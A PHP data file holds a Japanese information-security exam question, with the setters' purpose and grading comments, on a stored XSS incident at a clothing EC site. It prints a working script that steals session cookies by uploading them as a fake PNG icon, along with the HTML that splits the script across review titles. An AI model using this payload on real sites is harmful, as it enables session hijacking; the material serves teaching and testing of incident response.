<?php

return [
    'exam_code' => '2023_aki_1',
    'sentence' => <<<'EOF'
Webアプリケーションプログラムの開発に関する次の記述を読んで,設問に答えよ。

Q 社は,洋服のEC事業を手掛ける従業員100名の会社である。WebアプリQというWebアプリケーションプログラムでECサイトを運営している。
ECサイトのドメイン名は“□□□.co.jp”であり,利用者はWebアプリQにHTTPSでアクセスする。WebアプリQの開発と運用は,Q社開発部が行っている。
今回,WebアプリQに,ECサイトの会員による商品レビュー機能を追加した。図1は,WebアプリQの主な機能である。

<図1 Web アプリQ の主な機能>
1. 会員登録機能
ECサイトの会員登録を行う。
2. ログイン機能
会員IDとパスワードで会員を認証する。ログインした会員には,セッションIDをcookieとして払い出す。
3. カートへの商品の追加及び削除機能
(省略)
4. 商品の購入機能
ログイン済み会員だけが利用できる。
(省略)
5. 商品レビュー機能
商品レビューを投稿したり閲覧したりするページを提供する。商品レビューの投稿は,ログイン済み会員だけが利用できる。
会員がレビューページに入力できる項目のうち,レビュータイトルとレビュー詳細の欄は自由記述が可能であり,それぞれ50字と300字の入力文字数制限を設けている。
6. 会員プロフィール機能
アイコン画像をアップロードして設定するためのページ(以下,会員プロフィール設定ページという)や,クレジットカード情報を登録するページを提供する。どちらのページもログイン済み会員だけが利用できる。
アイコン画像のアップロードは,次をパラメータとして“https://ロロロ.co.jp/user/upload” に対して行う。
・画像ファイル 注1）
“https://ロロロ.co.jp/user/profile” にアクセスして払い出されたトークン 注2）
パラメータのトークンが,"https://ロロロ.co.jp/user/profile" にアクセスして払い出されたものと一致したときは,アップロードが成功する。
アップロードしたアイコン画像は、会員プロフィール設定ページや,レビューページに表示される。
(省略)

注1）パラメータ名は,“uploadfile” である。
注2）パラメータ名は,“token” である。
</図1>

ある日,会員から,無地Tシャツのレビューページ(以下,ページVという)に16件表示されるはずのレビューが2件しか表示されていないという問合せが寄せられた。
開発部のリーダーであるNさんがページVを閲覧してみると、画面遷移上おかしな点はなく,図2が表示された。

<図2 ページV>
商品レビュー 無地Tシャツ
レビューを投稿する
★ 4.9 16件のレビュー
(アイコン) 会員A
2023年4月10日
★★★★★ Good
Nice shirt!
(アイコン) 会員B
2023年4月1日
★★★★ 形も素材も良い
サイズ感がぴったりフィットして気に入っています(>_<)
手触りも良く,値段を考えると良い商品です。

注記）(アイコン)は、会員がアイコン画像をアップロードしていない場合に表示される画像である。
</図2>

WebアプリQのレビューページでは,次の項目がレビューの件数分表示されるはずである。
・レビューを投稿した会員のアイコン画像
・レビューを投稿した会員の表示名
・レビューが投稿された日付
・レビュー評価 (1~5個の★)
・会員が入力したレビュータイトル
・会員が入力したレビュー詳細
不審に思ったNさんはページVのHTMLを確認した。図3は,ページVのHTMLである。

<図3 ページVのHTML>
<div class="review-number">16件のレビュー</div>
<div class="review">
<div class="icon"><img src="/users/dac6c8f12f867ed5/icon.png"></div> <div class="displayname">会員 A</div>
<div class="date">2023年4月10日</div><div class="star">★★★★★</div> <div class="review-title">Good<script>xhr=new XMLHttpRequest(); /*</div> <div class="description">a</div>
</div>
<div class="review">
<div class="icon"><img src="/users/dac6c8f12f867ed5/icon.png"></div> <div class="displayname">会員 A</div>
<div class="date">2023年4月10日</div><div class="star">★★★★★</div> <div class="review-title">*/url1="https://☐☐☐.co.jp/user/profile";/*</div> <div class="description">a</div>
</div>
(省略)
<div class="review">
<div class="icon"><img src="/users/dac6c8f12f867ed5/icon.png"></div>
<div class="displayname">会員 A</div>
<div class="date">2023年4月10日</div><div class="star">★★★★★</div>
<div class="review-title">*/xhr2,send (form); } </script></div>
<div class="description">Nice shirt!</div>
</div>
<div class="review">
<div class="icon"><img src="/users/94774f6887f73b91/icon.png"></div>
<div class="displayname">会員 B</div>
<div class="date">2023年4月1日</div><div class="star">★★★★</div>
<div class="review-title">形も素材も良い</div>
<div class="description">サイズ感がぴったりフィットして気に入っています(&gt;_&lt;)</div>
</div>
<div class="review-end">以上,全16件のレビュー</div>
(省略)
</図3>

図3のHTMLを確認したNさんは,会員Aによって15件のレビューが投稿されていること,及びページVには長いスクリプトが埋め込まれていることに気付いた。Nさんは,ページVにアクセスしたときに生じる影響を調査するために,アクセスしたと
きにWebブラウザで実行されるスクリプトを抽出した。図4は,Nさんが抽出したスクリプトである。

<図4 Nさんが抽出したスクリプト>
1: xhr = new XMLHttpRequest();
2: url1 = "https://ロロロ.co.jp/user/profile";
3: xhr.open("get",url1);
4: xhr.responseType = "document"; // レスポンスをテキストではなくDOMとして受信する。
5: xhr.send();
6: xhr.onload = function(){ // 以降は,1回目のXMLHttpRequest (XHR)のレスポンスの受信に成功してから実行される。
7: page = xhr.response;
8: token = page.getElementById("token").value;
9: xhr2 = new XMLHttpRequest();
10: url2 = "https://ロロロ.co.jp/user/upload";
11: xhr2.open("post",url2);
12: form = new FormData();
13: cookie = document.cookie;
14: fname = "a.png";
15: ftype="image/png";
16: file = new File([cookie],fname,{type: ftype});
    // アップロードするファイルオブジェクト
    // 第1引数: ファイルコンテンツ
    // 第2引数: ファイル名
    // 第3引数: MIMEタイプなどのオプション
17: form.append("uploadfile",file);
18: form.append("token",token);
19: xhr2.send (form);
20: }

注記）スクリプトの整形とコメントの追記は,Nさんが実施したものである。
</図4>

Nさんは,会員Aの投稿はクロスサイトスクリプティング(XSS)脆弱性を悪用した攻撃を成立させるためのものであるという疑いをもった。
NさんがWebアプリQを調べたところ,WebアプリQには,会員が入力したスクリプトが実行されてしまう脆弱性があることを確認した。
加えて,WebアプリQがcookieにHttpOnly属性を付与していないこと及びアップロードされた画像ファイルの形式をチェックしていないことも確認した。
Q社は,必要な対策を施し,会員への必要な対応も行った。
EOF,
    'purpose' => <<<'EOF'
脆弱性を悪用されたインシデント発生時の対策立案においては,影響度の把握や適切な対策検討,及び優先度決定のため,どのような脆弱性がどのように悪用されたかを理解した上で対応を検討する必要がある。
本問では,Webアプリケーションプログラムの脆弱性を悪用されたことによるインシデント対応を題材に,HTMLやECMAScriptから悪用された脆弱性と問題点を読み解き,対策を立案する能力を問う。
EOF,
    'review_comment' => <<<'EOF'
問1では,Webアプリケーションプログラムの脆ぜい弱性悪用によって発生したインシデントへの対応を題材に,悪用されたクロスサイトスクリプティング（XSS）脆弱性の把握と対応について出題した。全体として正答率は平均的であった。
設問 1(1)は,正答率は平均的であったが,スクリプトでDOMを使用していたことからか,“DOM Based XSS” と誤って解答する受験者が散見された。脆弱性の種類や埋め込まれた状況に応じた適切な対策を施すためにも,脆弱性は特徴や対策方法まで含めて,正確に理解してほしい。
設問 2 は,正答率が平均的であった。HTMLやスクリプトをよく確認すれば解答ができたはずであるが,“開発者ツールで入力制限を削除してから投稿した”のように,確認が不足していると考えられる解答が一部に見られた。攻撃者の残した痕跡を注意深く確認し,攻撃者の行った攻撃の方法を正確に把握する能力を培ってほしい。
設問 3(3)は,正答率が高かった。攻撃によって起きるかもしれない被害を推察して解答する必要がある問題であったが,ECサイトにおいてcookieが攻撃者に取得されることの影響について,よく理解されていた。
EOF,
];
